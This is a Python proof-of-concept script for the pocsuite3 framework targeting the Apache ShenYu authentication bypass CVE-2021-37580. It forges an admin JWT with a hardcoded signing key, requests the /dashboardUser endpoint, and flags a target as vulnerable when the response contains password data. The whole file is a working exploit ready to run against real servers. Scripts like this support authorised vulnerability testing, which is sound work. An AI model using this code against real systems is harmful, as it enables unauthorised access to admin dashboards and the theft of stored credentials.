#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import re
import time
import jwt
from urllib.parse import urlparse
from pocsuite3.api import register_poc
from pocsuite3.api import Output, POCBase
from pocsuite3.api import POC_CATEGORY, VUL_TYPE

def generateToken():
    headers = {
        "alg": "HS256",
        "typ": "JWT"
    }
    salt = "2095132720951327"
    exp = int(time.time())
    payload = {
        "userName": 'admin',
        "exp": exp
    }

    token = jwt.encode(payload=payload, key=salt,
                       algorithm='HS256', headers=headers).decode('utf-8')
    return token

def check(url):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:93.0) Gecko/20100101 Firefox/93.0',
        'X-Access-Token': generateToken()
    }
    try:
        url1 = url + '/dashboardUser'
        response = requests.get(url1, headers=headers, verify=False, timeout=3)
        print(headers)
        if response.status_code == 200 and 'password' in response.text:
            return True, response.text
        else:
            return False, None
    except Exception as e:
        print(e)
        return False, None

class TestPOC(POCBase):
    vulID = ''
    version = '1'
    author = ''
    vulDate = '2021-11-17'
    createDate = '2021-11-17'
    updateDate = '2021-11-17'
    references = []
    name = 'Apache ShenYu-Unauthorized未授权访问漏洞'
    appPowerLink = ''
    appName = 'Apache ShenYu-Unauthorized未授权访问漏洞'
    appVersion = ''
    vulType = 'Apache漏洞'
    category = ''
    desc = '''
            Apache ShenYu-Unauthorized未授权访问漏洞CVE-2021-37580
    '''

    def _verify(self):
        '''
        verify:
        '''
        result = {}
        pr = urlparse(self.url)
        # print(pr)
        # print(pr.port)
        if pr.port:  # and pr.port not in ports:
            ports = [pr.port]
        else:
            ports = [80, 443]
        for port in ports:
            uri = "{0}://{1}:{2}".format(pr.scheme, pr.hostname, str(port))
            try:
                status, msg = check(uri)
                if status:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = uri
                    result['extra'] = {}
                    result['extra']['ok'] = msg
                    break
            except Exception as e:
                print(e)

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail("target is not vulnerable")
        return output

register_poc(TestPOC)
